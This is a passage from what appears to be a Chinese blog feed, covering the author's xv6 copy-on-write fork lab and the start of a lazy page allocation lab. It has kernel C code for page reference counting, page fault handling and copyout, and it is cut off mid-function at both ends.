page</strong>的分配和内容的复制。而实际的<strong>页框</strong>(physical page)分配，延迟到父进程或子进程执行写操作——因为其余指令不更改内存空间数据，则共享一个<strong>physical page</strong>完全没问题</p><p>自然的，其实现思路也和<strong>lazy allocation</strong>基本一致，推迟<strong>fork</strong>系统调用中<strong>physical page</strong>的分配和映射，找到触发进程写访问的位置，并在该位置完成最终的<strong>physical page</strong>的分配和映射</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>本次实验将进程<strong>fork</strong>时的申请的内存更改为<strong>Copy-on-Write</strong>方式，则更改<strong>fork</strong>系统调用的<strong>uvmcopy</strong>函数，该函数负责子进程内存空间的分配<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/vm.c</span></span><br><span class="line"><span class="comment">// Given a parent process&#x27;s page table, copy</span></span><br><span class="line"><span class="comment">// its memory into a child&#x27;s page table.</span></span><br><span class="line"><span class="comment">// Copies both the page table and the</span></span><br><span class="line"><span class="comment">// physical memory.</span></span><br><span class="line"><span class="comment">// returns 0 on success, -1 on failure.</span></span><br><span class="line"><span class="comment">// frees any allocated pages on failure.</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">uvmcopy</span><span class="params">(<span class="type">pagetable_t</span> old, <span class="type">pagetable_t</span> new, uint64 sz)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pte_t</span> *pte;</span><br><span class="line">  uint64 pa, i, </span><br><span class="line">        mask = ~PTE_W;</span><br><span class="line">  uint flags;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; sz; i += PGSIZE)&#123;</span><br><span class="line">    <span class="keyword">if</span>((pte = walk(old, i, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: pte should exist&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: page not present&quot;</span>);</span><br><span class="line">    pa = PTE2PA(*pte);</span><br><span class="line">    flags = PTE_FLAGS(*pte);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy-on-Write fork</span></span><br><span class="line">    <span class="comment">// So just copy the pte and mark pages</span></span><br><span class="line">    <span class="comment">// as no writable</span></span><br><span class="line">    phy_page_acquire(pa);</span><br><span class="line">    *pte = *pte &amp; mask;</span><br><span class="line">    <span class="keyword">if</span>(mappages(new, i, PGSIZE, pa, flags &amp; mask) != <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">goto</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> err:</span><br><span class="line">  uvmunmap(new, <span class="number">0</span>, i / PGSIZE, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到，子进程仅仅复制了父进程的页表项，即共用相同的<strong>physical page</strong>，并更改其权限为不可读(从而可以捕获所有的写指令)<br>这样做有一个问题，在释放的时候可能会<strong>double free</strong>，从而造成极其严重的后果。因此，对于<strong>physical page</strong>添加引用计数机制，其机制如下所示</p><ol><li>当有虚拟地址和<strong>physical page</strong>映射时，该<strong>physical page</strong>的引用加一</li><li>当释放<strong>physical page</strong>时，只有引用计数为1时，才将该<strong>physical page</strong>插入到空闲链上并将引用计数置零；否则仅仅将其引用计数减一</li></ol><p>这样子在复用原来的代码基础上，完美的解决了<strong>double free</strong>问题。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/kalloc.c</span></span><br><span class="line"><span class="comment">// physical page reference nubmer</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> refs[PGROUNDUP(PHYSTOP) / PGSIZE + <span class="number">1</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PHYIDX(addr)  ( \</span></span><br><span class="line"><span class="meta">        (((uint64)addr) - (uint64)end) / PGSIZE\</span></span><br><span class="line"><span class="meta">        )</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// try to acquire this page, so increase the physical acquire page</span></span><br><span class="line"><span class="comment">// reference in refs array.</span></span><br><span class="line">uint64 <span class="title function_">phy_page_acquire</span><span class="params">(uint64 addr)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint64 val = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span>(addr &gt;= PHYSTOP)</span><br><span class="line">    panic(<span class="string">&quot;phy_page_acquire: addr is too big\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  uint64 idx = PHYIDX(addr);</span><br><span class="line">  </span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  <span class="keyword">if</span>((val = ++refs[idx]) &lt;= <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;phy_page_acquire: \n&quot;</span>);</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint64 <span class="title function_">phy_page_ref</span><span class="params">(uint64 addr)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint64 val = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span>(addr &gt;= PHYSTOP)</span><br><span class="line">    panic(<span class="string">&quot;phy_page_ref: addr is too big\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  uint64 idx = PHYIDX(addr);</span><br><span class="line">  </span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  <span class="keyword">if</span>((val = refs[idx]) &lt; <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;phy_page_ref: invalid val\n&quot;</span>);</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// try to release this page, so decrease the physical acquire page</span></span><br><span class="line"><span class="comment">// reference in refs array.</span></span><br><span class="line"><span class="type">static</span> uint64</span><br><span class="line"><span class="title function_">phy_page_release</span><span class="params">(uint64 addr)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint64 val = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span>(addr &gt;= PHYSTOP)</span><br><span class="line">    panic(<span class="string">&quot;phy_page_release: addr is too big\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  uint64 idx = PHYIDX(addr);</span><br><span class="line">  </span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  <span class="keyword">if</span>((val = --refs[idx]) &lt; <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;phy_page_release: invalid val\n&quot;</span>);</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Free the page of physical memory pointed at by v,</span></span><br><span class="line"><span class="comment">// which normally should have been returned by a</span></span><br><span class="line"><span class="comment">// call to kalloc().  (The exception is when</span></span><br><span class="line"><span class="comment">// initializing the allocator; see kinit above.)</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">kfree</span><span class="params">(<span class="type">void</span> *pa)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(((uint64)pa % PGSIZE) != <span class="number">0</span> || (<span class="type">char</span>*)pa &lt; end || (uint64)pa &gt;= PHYSTOP)</span><br><span class="line">    panic(<span class="string">&quot;kfree&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// release the page only when</span></span><br><span class="line">  <span class="comment">// page&#x27;s reference is 0</span></span><br><span class="line">  <span class="keyword">if</span>(phy_page_release((uint64)pa) == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fill with junk to catch dangling refs.</span></span><br><span class="line">    <span class="built_in">memset</span>(pa, <span class="number">1</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">    r = (<span class="keyword">struct</span> run*)pa;</span><br><span class="line"></span><br><span class="line">    acquire(&amp;kmem.lock);</span><br><span class="line">    r-&gt;next = kmem.freelist;</span><br><span class="line">    kmem.freelist = r;</span><br><span class="line">    release(&amp;kmem.lock);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate one 4096-byte page of physical memory.</span></span><br><span class="line"><span class="comment">// Returns a pointer that the kernel can use.</span></span><br><span class="line"><span class="comment">// Returns 0 if the memory cannot be allocated.</span></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line"><span class="title function_">kalloc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  r = kmem.freelist;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    kmem.freelist = r-&gt;next;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(r) &#123;</span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">char</span>*)r, <span class="number">5</span>, PGSIZE); <span class="comment">// fill with junk</span></span><br><span class="line">    phy_page_acquire((uint64)r); <span class="comment">// add page reference</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span>*)r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>其次则是在实际触发写访存时，完成最终的<strong>Copy-on-Write</strong>。主要有两个位置，一个是<strong>U-mode</strong>下用户程序的写指令，可以通过<strong>trap</strong>完成捕获并处理；另一个则是<strong>S-mode</strong>下，内核可能向用户地址空间写入数据(如系统调用写出数据)，则可以提前处理<strong>Copy-on-Write</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/trap.c</span></span><br><span class="line"><span class="comment">// if it is triggered by Copy-on-Write</span></span><br><span class="line"><span class="comment">// just call the copy_on_write function</span></span><br><span class="line"><span class="comment">// to deal with it, or kernel should</span></span><br><span class="line"><span class="comment">// panic</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">handle_page_fault</span><span class="params">(uint64 va)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(copy_on_write(va) != <span class="number">0</span>)</span><br><span class="line">    trap_panic();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// handle an interrupt, exception, or system call from user space.</span></span><br><span class="line"><span class="comment">// called from trampoline.S</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">usertrap</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">switch</span>(scause) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xf</span>:</span><br><span class="line">        <span class="comment">//Store page fault</span></span><br><span class="line">        handle_page_fault(r_stval());</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        trap_panic();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/vm.c</span></span><br><span class="line"><span class="comment">// Copy from kernel to user.</span></span><br><span class="line"><span class="comment">// Copy len bytes from src to virtual address dstva in a given page table.</span></span><br><span class="line"><span class="comment">// Return 0 on success, -1 on error.</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">copyout</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 dstva, <span class="type">char</span> *src, uint64 len)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line">  <span class="type">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = PGROUNDDOWN(dstva);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// walk will panic if va0 &gt;= MAXVA,</span></span><br><span class="line">    <span class="comment">// unlike the walkaddr</span></span><br><span class="line">    <span class="keyword">if</span>(va0 &gt;= MAXVA)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    pte = walk(pagetable, va0, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pte == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// handle copy-on-write in kernel</span></span><br><span class="line">    <span class="keyword">if</span>(((uint64)(*pte &amp; PTE_W) == <span class="number">0</span>) &amp;&amp; copy_on_write(va0) != <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    pa0 = PTE2PA(*pte);</span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    n = PGSIZE - (dstva - va0);</span><br><span class="line">    <span class="keyword">if</span>(n &gt; len)</span><br><span class="line">      n = len;</span><br><span class="line">    memmove((<span class="type">void</span> *)(pa0 + (dstva - va0)), src, n);</span><br><span class="line"></span><br><span class="line">    len -= n;</span><br><span class="line">    src += n;</span><br><span class="line">    dstva = va0 + PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>最后，则是实现实际的<strong>Copy-on-Write</strong>，其逻辑也比较简单</p><ol><li>如果当前访问的<strong>virtual address</strong>所在的<strong>physical page</strong>引用计数为1，则表示只有当前进程在使用该<strong>physical page</strong>，则直接添加修改为可写即可</li><li>如果引用计数不为1，则完成实际的<strong>physical page</strong>的分配和映射即可</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/vm.c</span></span><br><span class="line"><span class="comment">// execute the Copy-on-Write</span></span><br><span class="line"><span class="comment">// when trigger a store page fault for</span></span><br><span class="line"><span class="comment">// its flags without PTE_W, then</span></span><br><span class="line"><span class="comment">// use Copy-on-Write</span></span><br><span class="line">uint64 <span class="title function_">copy_on_write</span><span class="params">(uint64 va)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  <span class="type">pte_t</span> *pte;</span><br><span class="line">  uint64 pa, new_pa, flag;</span><br><span class="line">  va = PGROUNDDOWN(va);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// access the virtual address out of</span></span><br><span class="line">  <span class="comment">// alloced virtual memory</span></span><br><span class="line">  <span class="keyword">if</span>(va &gt;= p-&gt;sz)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// if access the guard page under the stack</span></span><br><span class="line">  <span class="comment">// it should kill the process</span></span><br><span class="line">  pte = walk(p-&gt;pagetable, va, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span>(pte &amp;&amp; (*pte &amp; PTE_V) != <span class="number">0</span> &amp;&amp; ((*pte &amp; PTE_U) == <span class="number">0</span> || (*pte &amp; PTE_W) != <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  </span><br><span class="line">  pa = PTE2PA(*pte);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(phy_page_ref(pa) == <span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// don not need alloc a new physical page</span></span><br><span class="line">    <span class="comment">// just change the map flag</span></span><br><span class="line">    *pte |= PTE_W;</span><br><span class="line"></span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    flag = PTE_FLAGS(*pte);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// alloc a new physical page</span></span><br><span class="line">    <span class="keyword">if</span>((new_pa = (uint64)kalloc()) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// copy the content</span></span><br><span class="line">    <span class="comment">// from origin memory</span></span><br><span class="line">    <span class="comment">// to new physical memory</span></span><br><span class="line">    memmove((<span class="type">void</span>*)new_pa, (<span class="type">const</span> <span class="type">void</span>*)pa, PGSIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unmap the va</span></span><br><span class="line">    uvmunmap(p-&gt;pagetable, va, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">     <span class="comment">// and remap it to relative</span></span><br><span class="line">     <span class="comment">// virtual address</span></span><br><span class="line">    <span class="keyword">if</span>(mappages(p-&gt;pagetable, va, PGSIZE, new_pa, flag | PTE_W) != <span class="number">0</span>) &#123;</span><br><span class="line">      kfree((<span class="type">void</span>*)new_pa);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本次试验中，感悟颇多。<br>在写代码的过程中，除了写之前良好的构思外，<strong>debug</strong>能力是重中之重。一方面要学会<strong>防御式编程</strong>，从而在异常时方便调试；另一方面要学会定位错误实际发生的位置——根据崩溃信息，在适当的地址处下断点，并结合动态调试器中上下文信息完成调试。<br>比如在实现<strong>Copy-on-Write</strong>函数时，没有将原始<strong>physical page</strong>内容复制到新分配的<strong>physical page</strong>中，导致触发<strong>非法指令</strong>异常。则首先应该在<strong>usertrap</strong>处下断点，查看具体的异常信息，发现其调用栈中充满无效数据。由于当前仅仅实现了处理<strong>page fault</strong>的功能，则在<strong>usertrap</strong>断点处，单步跟随处理写异常的执行流，很容易发现异常处理结束后，其栈上大量的<strong>0x05</strong>(内存分配时填充的垃圾数据)，从而解决该bug</p><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>执行如下命令，完成实验测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make grade</span><br></pre></td></tr></table></figure><br><img src="copy_on_write实验结果.png" alt="Copy-on-Write实验结果"></p>]]></content>
      
      
      <categories>
          
          <category> 手写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内核 </tag>
            
            <tag> 手写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xv6-五</title>
      <link href="/2022/06/11/xv6-%E4%BA%94/"/>
      <url>/2022/06/11/xv6-%E4%BA%94/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这篇博客研究<strong>lazy page allocation</strong>机制</p><h1 id="lazy-page-allocation"><a href="#lazy-page-allocation" class="headerlink" title="lazy page allocation"></a>lazy page allocation</h1><p>一个操作系统中可以包含多个进程，进程的地址空间所占用的虚拟地址空间之和一般远远大于实际的物理内存之和。</p><p>因此，一般操作系统通过通过如下几种方法，将进程的超大的虚拟地址空间映射到有限的物理地址空间中</p><ol><li>不同虚拟内存映射相同物理内存<br>实际上，不同进程或相同进程的不同虚拟内存有很大一部分包含相同的数据(linux的<strong>glibc</strong>库, 内核的<strong>stack0</strong>数据)。因此，完全可以将这些虚拟内存指向相同的物理地址</li><li>延迟分配<br>往往进程会申请超过实际需要的内存，并且申请后不会立即使用。因此，当进程申请内存时，仅仅分配<strong>虚拟内存</strong>并记录在描述符中，但是并不实际分配物理内存并映射。也就是此时并不消耗物理内存。当进程真正访问该虚拟内存时，会产生<strong>page fault</strong>，从而在异常处理时完成实际的映射即可</li></ol><h1 id="Lab-lazy-allocation"><a href="#Lab-lazy-allocation" class="headerlink" title="Lab lazy allocation"></a>Lab lazy allocation</h1><p>本次<a href="https://pdos.csail.mit.edu/6.828/2020/labs/lazy.html">lab</a>帮助熟悉<strong>xv6</strong>的<strong>lazy allocation</strong>机制</p><h2 id="Lazy-allocation"><a href="#Lazy-allocation" class="headerlink" title="Lazy allocation"></a>Lazy allocation</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><blockquote><p>Modify the code in <strong>trap.c</strong> to respond to a page fault from user space by mapping a newly-allocated page of physical memory at the faulting address, and then returning back to user space to let the process continue executing. You should add your code just before the <strong>printf</strong> call that produced the “usertrap(): …” message. Modify whatever other xv6 kernel code you need to in order to get <strong>echo hi</strong> to work and all of both <strong>lazytests</strong> and <strong>usertests</strong> pass. </p></blockquote><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>一般来说，进程的内存分配，指同时分配<strong>virtual address</strong>和<strong>physical address</strong>，并将两者进行映射。<br>而<strong>lazy allocation</strong>则是将分配<strong>physical address</strong>的时间推迟到访问对应的<strong>virtual address</strong>时，才开始分配并映射。<br>因此，实际上实现<strong>lazy allocation</strong>的整体思路很简单，找到进程的<strong>内存分配</strong>和<strong>内存访问</strong>，将<strong>physical address</strong>的分配从<strong>内存分配</strong>部分的代码转移到<strong>内存访问</strong>处即可</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>由于本次试验将进程的动态内存更改为<strong>lazy allocation</strong>方式，则更改<strong>growproc</strong>函数即可<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/proc.c</span></span><br><span class="line"><span class="comment">// Grow or shrink user memory by n bytes.</span></span><br><span class="line"><span class="comment">// Return 0 on success, -1 on failure.</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">growproc</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint sz;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  sz = p-&gt;sz;</span><br><span class="line">  <span class="keyword">if</span>(n &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    sz += n;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(n &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    sz = 